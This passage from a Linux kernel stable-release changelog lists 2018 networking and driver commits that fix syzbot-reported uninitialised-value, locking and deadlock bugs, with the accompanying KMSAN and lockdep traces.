sock\_sendmsg\_nosec net/socket.c:630 [inline]
sock\_sendmsg net/socket.c:640 [inline]
\_\_\_sys\_sendmsg+0xec0/0x1310 net/socket.c:2046
\_\_sys\_sendmsg net/socket.c:2080 [inline]
SYSC\_sendmsg+0x2a3/0x3d0 net/socket.c:2091
SyS\_sendmsg+0x54/0x80 net/socket.c:2087
do\_syscall\_64+0x309/0x430 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x3d/0xa2
Uninit was stored to memory at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_save\_stack mm/kmsan/kmsan.c:293 [inline]
kmsan\_internal\_chain\_origin+0x12b/0x210 mm/kmsan/kmsan.c:684
\_\_msan\_chain\_origin+0x69/0xc0 mm/kmsan/kmsan\_instr.c:521
inet\_csk\_clone\_lock+0x503/0x580 net/ipv4/inet\_connection\_sock.c:797
dccp\_create\_openreq\_child+0x7f/0x890 net/dccp/minisocks.c:92
dccp\_v4\_request\_recv\_sock+0x22c/0xe90 net/dccp/ipv4.c:408
dccp\_v6\_request\_recv\_sock+0x290/0x2000 net/dccp/ipv6.c:414
dccp\_check\_req+0x7b9/0x8f0 net/dccp/minisocks.c:197
dccp\_v4\_rcv+0x12e4/0x2630 net/dccp/ipv4.c:840
ip\_local\_deliver\_finish+0x6ed/0xd40 net/ipv4/ip\_input.c:216
NF\_HOOK include/linux/netfilter.h:288 [inline]
ip\_local\_deliver+0x43c/0x4e0 net/ipv4/ip\_input.c:257
dst\_input include/net/dst.h:449 [inline]
ip\_rcv\_finish+0x1253/0x16d0 net/ipv4/ip\_input.c:397
NF\_HOOK include/linux/netfilter.h:288 [inline]
ip\_rcv+0x119d/0x16f0 net/ipv4/ip\_input.c:493
\_\_netif\_receive\_skb\_core+0x47cf/0x4a80 net/core/dev.c:4562
\_\_netif\_receive\_skb net/core/dev.c:4627 [inline]
process\_backlog+0x62d/0xe20 net/core/dev.c:5307
napi\_poll net/core/dev.c:5705 [inline]
net\_rx\_action+0x7c1/0x1a70 net/core/dev.c:5771
\_\_do\_softirq+0x56d/0x93d kernel/softirq.c:285
Uninit was created at:
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:278 [inline]
kmsan\_internal\_poison\_shadow+0xb8/0x1b0 mm/kmsan/kmsan.c:188
kmsan\_kmalloc+0x94/0x100 mm/kmsan/kmsan.c:314
kmem\_cache\_alloc+0xaab/0xb90 mm/slub.c:2756
reqsk\_alloc include/net/request\_sock.h:88 [inline]
inet\_reqsk\_alloc+0xc4/0x7f0 net/ipv4/tcp\_input.c:6145
dccp\_v4\_conn\_request+0x5cc/0x1770 net/dccp/ipv4.c:600
dccp\_v6\_conn\_request+0x299/0x1880 net/dccp/ipv6.c:317
dccp\_rcv\_state\_process+0x2ea/0x2410 net/dccp/input.c:612
dccp\_v4\_do\_rcv+0x229/0x340 net/dccp/ipv4.c:682
dccp\_v6\_do\_rcv+0x16d/0x1220 net/dccp/ipv6.c:578
sk\_backlog\_rcv include/net/sock.h:908 [inline]
\_\_sk\_receive\_skb+0x60e/0xf20 net/core/sock.c:513
dccp\_v4\_rcv+0x24d4/0x2630 net/dccp/ipv4.c:874
ip\_local\_deliver\_finish+0x6ed/0xd40 net/ipv4/ip\_input.c:216
NF\_HOOK include/linux/netfilter.h:288 [inline]
ip\_local\_deliver+0x43c/0x4e0 net/ipv4/ip\_input.c:257
dst\_input include/net/dst.h:449 [inline]
ip\_rcv\_finish+0x1253/0x16d0 net/ipv4/ip\_input.c:397
NF\_HOOK include/linux/netfilter.h:288 [inline]
ip\_rcv+0x119d/0x16f0 net/ipv4/ip\_input.c:493
\_\_netif\_receive\_skb\_core+0x47cf/0x4a80 net/core/dev.c:4562
\_\_netif\_receive\_skb net/core/dev.c:4627 [inline]
process\_backlog+0x62d/0xe20 net/core/dev.c:5307
napi\_poll net/core/dev.c:5705 [inline]
net\_rx\_action+0x7c1/0x1a70 net/core/dev.c:5771
\_\_do\_softirq+0x56d/0x93d kernel/softirq.c:285
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit d33f1af67ecad57fb4088734c26c1a62fe61ad6b
Author: Eric Dumazet
Date: Sat Apr 7 13:42:40 2018 -0700
net: fix uninit-value in \_\_hw\_addr\_add\_ex()
commit 77d36398d99f2565c0a8d43a86fd520a82e64bb8 upstream.
syzbot complained :
BUG: KMSAN: uninit-value in memcmp+0x119/0x180 lib/string.c:861
CPU: 0 PID: 3 Comm: kworker/0:0 Not tainted 4.16.0+ #82
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
Workqueue: ipv6\_addrconf addrconf\_dad\_work
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:17 [inline]
dump\_stack+0x185/0x1d0 lib/dump\_stack.c:53
kmsan\_report+0x142/0x240 mm/kmsan/kmsan.c:1067
\_\_msan\_warning\_32+0x6c/0xb0 mm/kmsan/kmsan\_instr.c:676
memcmp+0x119/0x180 lib/string.c:861
\_\_hw\_addr\_add\_ex net/core/dev\_addr\_lists.c:60 [inline]
\_\_dev\_mc\_add+0x1c2/0x8e0 net/core/dev\_addr\_lists.c:670
dev\_mc\_add+0x6d/0x80 net/core/dev\_addr\_lists.c:687
igmp6\_group\_added+0x2db/0xa00 net/ipv6/mcast.c:662
ipv6\_dev\_mc\_inc+0xe9e/0x1130 net/ipv6/mcast.c:914
addrconf\_join\_solict net/ipv6/addrconf.c:2078 [inline]
addrconf\_dad\_begin net/ipv6/addrconf.c:3828 [inline]
addrconf\_dad\_work+0x427/0x2150 net/ipv6/addrconf.c:3954
process\_one\_work+0x12c6/0x1f60 kernel/workqueue.c:2113
worker\_thread+0x113c/0x24f0 kernel/workqueue.c:2247
kthread+0x539/0x720 kernel/kthread.c:239
Fixes: f001fde5eadd ("net: introduce a list of device addresses dev\_addr\_list (v6)")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit f919b4b0586b47343c1ac11c31e620daf4c90af2
Author: Eric Dumazet
Date: Sat Apr 7 13:42:39 2018 -0700
net: initialize skb->peeked when cloning
commit b13dda9f9aa7caceeee61c080c2e544d5f5d85e5 upstream.
syzbot reported \_\_skb\_try\_recv\_from\_queue() was using skb->peeked
while it was potentially unitialized.
We need to clear it in \_\_skb\_clone()
Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 733bcbd3db47e9dc8b8c4a126f6e4198d3a6b1f0
Author: Eric Dumazet
Date: Sat Apr 7 13:42:38 2018 -0700
net: fix rtnh\_ok()
commit b1993a2de12c9e75c35729e2ffbc3a92d50c0d31 upstream.
syzbot reported :
BUG: KMSAN: uninit-value in rtnh\_ok include/net/nexthop.h:11 [inline]
BUG: KMSAN: uninit-value in fib\_count\_nexthops net/ipv4/fib\_semantics.c:469 [inline]
BUG: KMSAN: uninit-value in fib\_create\_info+0x554/0x8d20 net/ipv4/fib\_semantics.c:1091
@remaining is an integer, coming from user space.
If it is negative we want rtnh\_ok() to return false.
Fixes: 4e902c57417c ("[IPv4]: FIB configuration using struct fib\_config")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 4b016f0e749538bfebdfa5bea6aeebcd37ea9a0c
Author: Eric Dumazet
Date: Sat Apr 7 13:42:37 2018 -0700
netlink: fix uninit-value in netlink\_sendmsg
commit 6091f09c2f79730d895149bcfe3d66140288cd0e upstream.
syzbot reported :
BUG: KMSAN: uninit-value in ffs arch/x86/include/asm/bitops.h:432 [inline]
BUG: KMSAN: uninit-value in netlink\_sendmsg+0xb26/0x1310 net/netlink/af\_netlink.c:1851
Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit d7309c4e42449247ab242eb5dc06a45b4c8be943
Author: Eric Dumazet
Date: Sat Apr 7 13:42:36 2018 -0700
crypto: af\_alg - fix possible uninit-value in alg\_bind()
commit a466856e0b7ab269cdf9461886d007e88ff575b0 upstream.
syzbot reported :
BUG: KMSAN: uninit-value in alg\_bind+0xe3/0xd90 crypto/af\_alg.c:162
We need to check addr\_len before dereferencing sa (or uaddr)
Fixes: bb30b8848c85 ("crypto: af\_alg - whitelist mask and type")
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Cc: Stephan Mueller
Cc: Herbert Xu
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 24cd9a6e95b762f35ac4ebc767bfce6063efee9c
Author: Sowmini Varadhan
Date: Thu Mar 15 03:54:26 2018 -0700
rds: tcp: must use spin\_lock\_irq\* and not spin\_lock\_bh with rds\_tcp\_conn\_lock
commit 53d0e83f9329aa51dcc205b514dbee05cb4df309 upstream.
rds\_tcp\_connection allocation/free management has the potential to be
called from \_\_rds\_conn\_create after IRQs have been disabled, so
spin\_[un]lock\_bh cannot be used with rds\_tcp\_conn\_lock.
Bottom-halves that need to synchronize for critical sections protected
by rds\_tcp\_conn\_lock should instead use rds\_destroy\_pending() correctly.
Reported-by: syzbot+c68e51bb5e699d3f8d91@syzkaller.appspotmail.com
Fixes: ebeeb1ad9b8a ("rds: tcp: use rds\_destroy\_pending() to synchronize
netns/module teardown and rds connection/workq management")
Signed-off-by: Sowmini Varadhan
Acked-by: Santosh Shilimkar
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 58908eeb9b968895d245d5be01e807d7cad19aef
Author: Tom Herbert
Date: Wed Feb 14 09:22:42 2018 -0800
kcm: Call strp\_stop before strp\_done in kcm\_attach
commit dff8baa261174de689a44572d0ea182d7aa70598 upstream.
In kcm\_attach strp\_done is called when sk\_user\_data is already
set to fail the attach. strp\_done needs the strp to be stopped and
warns if it isn't. Call strp\_stop in this case to eliminate the
warning message.
Reported-by: syzbot+88dfb55e4c8b770d86e3@syzkaller.appspotmail.com
Fixes: e5571240236c5652f ("kcm: Check if sk\_user\_data already set in kcm\_attach"
Signed-off-by: Tom Herbert
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 66b8e0fe5aa561daab21338599bbfbf2bf6cb688
Author: Tero Kristo
Date: Tue Mar 27 20:47:04 2018 +0300
clk: ti: fix flag space conflict with clkctrl clocks
commit 269bd202bc0fd04e841cb123867fd3f49e04ace9 upstream.
The introduction of support for CLK\_SET\_RATE\_PARENT flag for clkctrl
clocks used a generic clock flag, which causes a conflict with the
rest of the clkctrl flags, namely the NO\_IDLEST flag. This can cause
boot failures on certain platforms where this flag is introduced, by
omitting the wait for the clockctrl module to be fully enabled before
proceeding with rest of the code.
Fix this by moving all the clkctrl specific flags to their own bit-range.
Signed-off-by: Tero Kristo
Fixes: 49159a9dc3da ("clk: ti: add support for CLK\_SET\_RATE\_PARENT flag")
Reported-by: Christophe Lyon
Tested-by: Tony Lindgren
Cc: Sam Protsenko
Signed-off-by: Greg Kroah-Hartman
commit fa3e0449d8680b066542f3fd959f973e3561f6e2
Author: Florian Westphal
Date: Wed Apr 4 21:13:30 2018 +0200
netfilter: ebtables: don't attempt to allocate 0-sized compat array
commit 3f1e53abff84cf40b1adb3455d480dd295bf42e8 upstream.
Dmitry reports 32bit ebtables on 64bit kernel got broken by
a recent change that returns -EINVAL when ruleset has no entries.
ebtables however only counts user-defined chains, so for the
initial table nentries will be 0.
Don't try to allocate the compat array in this case, as no user
defined rules exist no rule will need 64bit translation.
Reported-by: Dmitry Vyukov
Fixes: 7d7d7e02111e9 ("netfilter: compat: reject huge allocation requests")
Signed-off-by: Florian Westphal
Signed-off-by: Pablo Neira Ayuso
Signed-off-by: Greg Kroah-Hartman
commit 6f609a27c721dbf0fabee442940cab22441ea6b2
Author: Julian Anastasov
Date: Sat Apr 7 15:50:47 2018 +0300
ipvs: fix rtnl\_lock lockups caused by start\_sync\_thread
commit 5c64576a77894a50be80be0024bed27171b55989 upstream.
syzkaller reports for wrong rtnl\_lock usage in sync code [1] and [2]
We have 2 problems in start\_sync\_thread if error path is
taken, eg. on memory allocation error or failure to configure
sockets for mcast group or addr/port binding:
1. recursive locking: holding rtnl\_lock while calling sock\_release
which in turn calls again rtnl\_lock in ip\_mc\_drop\_socket to leave
the mcast group, as noticed by Florian Westphal. Additionally,
sock\_release can not be called while holding sync\_mutex (ABBA
deadlock).
2. task hung: holding rtnl\_lock while calling kthread\_stop to
stop the running kthreads. As the kthreads do the same to leave
the mcast group (sock\_release -> ip\_mc\_drop\_socket -> rtnl\_lock)
they hang.
Fix the problems by calling rtnl\_unlock early in the error path,
now sock\_release is called after unlocking both mutexes.
Problem 3 (task hung reported by syzkaller [2]) is variant of
problem 2: use \_trylock to prevent one user to call rtnl\_lock and
then while waiting for sync\_mutex to block kthreads that execute
sock\_release when they are stopped by stop\_sync\_thread.
[1]
IPVS: stopping backup sync thread 4500 ...
WARNING: possible recursive locking detected
4.16.0-rc7+ #3 Not tainted
--------------------------------------------
syzkaller688027/4497 is trying to acquire lock:
(rtnl\_mutex){+.+.}, at: [<00000000bb14d7fb>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
but task is already holding lock:
IPVS: stopping backup sync thread 4495 ...
(rtnl\_mutex){+.+.}, at: [<00000000bb14d7fb>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
other info that might help us debug this:
Possible unsafe locking scenario:
CPU0
----
lock(rtnl\_mutex);
lock(rtnl\_mutex);
\*\*\* DEADLOCK \*\*\*
May be due to missing lock nesting notation
2 locks held by syzkaller688027/4497:
#0: (rtnl\_mutex){+.+.}, at: [<00000000bb14d7fb>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
#1: (ipvs->sync\_mutex){+.+.}, at: [<00000000703f78e3>]
do\_ip\_vs\_set\_ctl+0x10f8/0x1cc0 net/netfilter/ipvs/ip\_vs\_ctl.c:2388
stack backtrace:
CPU: 1 PID: 4497 Comm: syzkaller688027 Not tainted 4.16.0-rc7+ #3
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS
Google 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:17 [inline]
dump\_stack+0x194/0x24d lib/dump\_stack.c:53
print\_deadlock\_bug kernel/locking/lockdep.c:1761 [inline]
check\_deadlock kernel/locking/lockdep.c:1805 [inline]
validate\_chain kernel/locking/lockdep.c:2401 [inline]
\_\_lock\_acquire+0xe8f/0x3e00 kernel/locking/lockdep.c:3431
lock\_acquire+0x1d5/0x580 kernel/locking/lockdep.c:3920
\_\_mutex\_lock\_common kernel/locking/mutex.c:756 [inline]
\_\_mutex\_lock+0x16f/0x1a80 kernel/locking/mutex.c:893
mutex\_lock\_nested+0x16/0x20 kernel/locking/mutex.c:908
rtnl\_lock+0x17/0x20 net/core/rtnetlink.c:74
ip\_mc\_drop\_socket+0x88/0x230 net/ipv4/igmp.c:2643
inet\_release+0x4e/0x1c0 net/ipv4/af\_inet.c:413
sock\_release+0x8d/0x1e0 net/socket.c:595
start\_sync\_thread+0x2213/0x2b70 net/netfilter/ipvs/ip\_vs\_sync.c:1924
do\_ip\_vs\_set\_ctl+0x1139/0x1cc0 net/netfilter/ipvs/ip\_vs\_ctl.c:2389
nf\_sockopt net/netfilter/nf\_sockopt.c:106 [inline]
nf\_setsockopt+0x67/0xc0 net/netfilter/nf\_sockopt.c:115
ip\_setsockopt+0x97/0xa0 net/ipv4/ip\_sockglue.c:1261
udp\_setsockopt+0x45/0x80 net/ipv4/udp.c:2406
sock\_common\_setsockopt+0x95/0xd0 net/core/sock.c:2975
SYSC\_setsockopt net/socket.c:1849 [inline]
SyS\_setsockopt+0x189/0x360 net/socket.c:1828
do\_syscall\_64+0x281/0x940 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x42/0xb7
RIP: 0033:0x446a69
RSP: 002b:00007fa1c3a64da8 EFLAGS: 00000246 ORIG\_RAX: 0000000000000036
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000446a69
RDX: 000000000000048b RSI: 0000000000000000 RDI: 0000000000000003
RBP: 00000000006e29fc R08: 0000000000000018 R09: 0000000000000000
R10: 00000000200000c0 R11: 0000000000000246 R12: 00000000006e29f8
R13: 00676e697279656b R14: 00007fa1c3a659c0 R15: 00000000006e2b60
[2]
IPVS: sync thread started: state = BACKUP, mcast\_ifn = syz\_tun, syncid = 4,
id = 0
IPVS: stopping backup sync thread 25415 ...
INFO: task syz-executor7:25421 blocked for more than 120 seconds.
Not tainted 4.16.0-rc6+ #284
"echo 0 > /proc/sys/kernel/hung\_task\_timeout\_secs" disables this message.
syz-executor7 D23688 25421 4408 0x00000004
Call Trace:
context\_switch kernel/sched/core.c:2862 [inline]
\_\_schedule+0x8fb/0x1ec0 kernel/sched/core.c:3440
schedule+0xf5/0x430 kernel/sched/core.c:3499
schedule\_timeout+0x1a3/0x230 kernel/time/timer.c:1777
do\_wait\_for\_common kernel/sched/completion.c:86 [inline]
\_\_wait\_for\_common kernel/sched/completion.c:107 [inline]
wait\_for\_common kernel/sched/completion.c:118 [inline]
wait\_for\_completion+0x415/0x770 kernel/sched/completion.c:139
kthread\_stop+0x14a/0x7a0 kernel/kthread.c:530
stop\_sync\_thread+0x3d9/0x740 net/netfilter/ipvs/ip\_vs\_sync.c:1996
do\_ip\_vs\_set\_ctl+0x2b1/0x1cc0 net/netfilter/ipvs/ip\_vs\_ctl.c:2394
nf\_sockopt net/netfilter/nf\_sockopt.c:106 [inline]
nf\_setsockopt+0x67/0xc0 net/netfilter/nf\_sockopt.c:115
ip\_setsockopt+0x97/0xa0 net/ipv4/ip\_sockglue.c:1253
sctp\_setsockopt+0x2ca/0x63e0 net/sctp/socket.c:4154
sock\_common\_setsockopt+0x95/0xd0 net/core/sock.c:3039
SYSC\_setsockopt net/socket.c:1850 [inline]
SyS\_setsockopt+0x189/0x360 net/socket.c:1829
do\_syscall\_64+0x281/0x940 arch/x86/entry/common.c:287
entry\_SYSCALL\_64\_after\_hwframe+0x42/0xb7
RIP: 0033:0x454889
RSP: 002b:00007fc927626c68 EFLAGS: 00000246 ORIG\_RAX: 0000000000000036
RAX: ffffffffffffffda RBX: 00007fc9276276d4 RCX: 0000000000454889
RDX: 000000000000048c RSI: 0000000000000000 RDI: 0000000000000017
RBP: 000000000072bf58 R08: 0000000000000018 R09: 0000000000000000
R10: 0000000020000000 R11: 0000000000000246 R12: 00000000ffffffff
R13: 000000000000051c R14: 00000000006f9b40 R15: 0000000000000001
Showing all locks held in the system:
2 locks held by khungtaskd/868:
#0: (rcu\_read\_lock){....}, at: [<00000000a1a8f002>]
check\_hung\_uninterruptible\_tasks kernel/hung\_task.c:175 [inline]
#0: (rcu\_read\_lock){....}, at: [<00000000a1a8f002>] watchdog+0x1c5/0xd60
kernel/hung\_task.c:249
#1: (tasklist\_lock){.+.+}, at: [<0000000037c2f8f9>]
debug\_show\_all\_locks+0xd3/0x3d0 kernel/locking/lockdep.c:4470
1 lock held by rsyslogd/4247:
#0: (&f->f\_pos\_lock){+.+.}, at: [<000000000d8d6983>]
\_\_fdget\_pos+0x12b/0x190 fs/file.c:765
2 locks held by getty/4338:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
2 locks held by getty/4339:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
2 locks held by getty/4340:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
2 locks held by getty/4341:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
2 locks held by getty/4342:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
2 locks held by getty/4343:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
2 locks held by getty/4344:
#0: (&tty->ldisc\_sem){++++}, at: [<00000000bee98654>]
ldsem\_down\_read+0x37/0x40 drivers/tty/tty\_ldsem.c:365
#1: (&ldata->atomic\_read\_lock){+.+.}, at: [<00000000c1d180aa>]
n\_tty\_read+0x2ef/0x1a40 drivers/tty/n\_tty.c:2131
3 locks held by kworker/0:5/6494:
#0: ((wq\_completion)"%s"("ipv6\_addrconf")){+.+.}, at:
[<00000000a062b18e>] work\_static include/linux/workqueue.h:198 [inline]
#0: ((wq\_completion)"%s"("ipv6\_addrconf")){+.+.}, at:
[<00000000a062b18e>] set\_work\_data kernel/workqueue.c:619 [inline]
#0: ((wq\_completion)"%s"("ipv6\_addrconf")){+.+.}, at:
[<00000000a062b18e>] set\_work\_pool\_and\_clear\_pending kernel/workqueue.c:646
[inline]
#0: ((wq\_completion)"%s"("ipv6\_addrconf")){+.+.}, at:
[<00000000a062b18e>] process\_one\_work+0xb12/0x1bb0 kernel/workqueue.c:2084
#1: ((addr\_chk\_work).work){+.+.}, at: [<00000000278427d5>]
process\_one\_work+0xb89/0x1bb0 kernel/workqueue.c:2088
#2: (rtnl\_mutex){+.+.}, at: [<00000000066e35ac>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
1 lock held by syz-executor7/25421:
#0: (ipvs->sync\_mutex){+.+.}, at: [<00000000d414a689>]
do\_ip\_vs\_set\_ctl+0x277/0x1cc0 net/netfilter/ipvs/ip\_vs\_ctl.c:2393
2 locks held by syz-executor7/25427:
#0: (rtnl\_mutex){+.+.}, at: [<00000000066e35ac>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
#1: (ipvs->sync\_mutex){+.+.}, at: [<00000000e6d48489>]
do\_ip\_vs\_set\_ctl+0x10f8/0x1cc0 net/netfilter/ipvs/ip\_vs\_ctl.c:2388
1 lock held by syz-executor7/25435:
#0: (rtnl\_mutex){+.+.}, at: [<00000000066e35ac>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
1 lock held by ipvs-b:2:0/25415:
#0: (rtnl\_mutex){+.+.}, at: [<00000000066e35ac>] rtnl\_lock+0x17/0x20
net/core/rtnetlink.c:74
Reported-and-tested-by: syzbot+a46d6abf9d56b1365a72@syzkaller.appspotmail.com
Reported-and-tested-by: syzbot+5fe074c01b2032ce9618@syzkaller.appspotmail.com
Fixes: e0b26cc997d5 ("ipvs: call rtnl\_lock early")
Signed-off-by: Julian Anastasov
Signed-off-by: Simon Horman
Signed-off-by: Pablo Neira Ayuso
Cc: Zubin Mithra
Cc: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman

